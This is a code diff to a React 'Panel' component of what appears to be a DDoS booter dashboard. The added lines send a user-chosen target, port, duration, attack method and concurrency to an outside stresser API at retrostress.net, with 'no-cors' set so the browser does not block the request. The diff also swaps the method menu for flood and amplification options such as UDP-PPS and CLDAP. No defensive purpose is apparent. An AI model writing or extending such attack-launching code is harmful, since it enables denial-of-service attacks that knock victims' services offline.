@@ -85,15 +85,29 @@ export default function Panel() {
     
     setIsAttacking(true);
     
+    // Enforce limits
+    const finalConns = Math.min(Number(conns) || 1, maxConns);
+    const finalDuration = Math.min(Number(time) || 10, maxDuration);
+
+    // Hit the L4 API if layer is L4
+    if (layer === 'L4') {
+      try {
+        // You can replace "YOUR_API_KEY" with your actual RetroStress API key.
+        const apiKey = "YOUR_API_KEY"; 
+        const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${method}&concurrent=${finalConns}`;
+        
+        // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
+        await fetch(apiUrl, { mode: 'no-cors' }); 
+      } catch (err) {
+        console.error("API Hit Error:", err);
+      }
+    }
+
     // Simulate API delay for a realistic user experience
     setTimeout(() => {
       const pad = (num) => String(num).padStart(2, '0');
       const d = new Date();
       const formattedDate = `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
-
-      // Enforce limits
-      const finalConns = Math.min(Number(conns) || 1, maxConns);
-      const finalDuration = Math.min(Number(time) || 10, maxDuration);
 
       const newTasks = [];
       for (let i = 0; i < finalConns; i++) {
@@ -263,9 +277,12 @@ export default function Panel() {
                 <option value="" disabled>Select attack method...</option>
                 {layer === 'L4' ? (
                   <>
-                    <option value="TCP-SYN">TCP-SYN</option>
-                    <option value="UDP-FLOOD">UDP-FLOOD</option>
-                    <option value="Bgmi">Bgmi</option>
+                    <option value="UDP-RAND">UDP-RAND</option>
+                    <option value="UDP-PPS">UDP-PPS</option>
+                    <option value="UDP-TINY">UDP-TINY</option>
+                    <option value="UDP-BIG">UDP-BIG</option>
+                    <option value="CLDAP">CLDAP</option>
+                    <option value="BGMI">BGMI</option>
                   </>
                 ) : (
                   <>
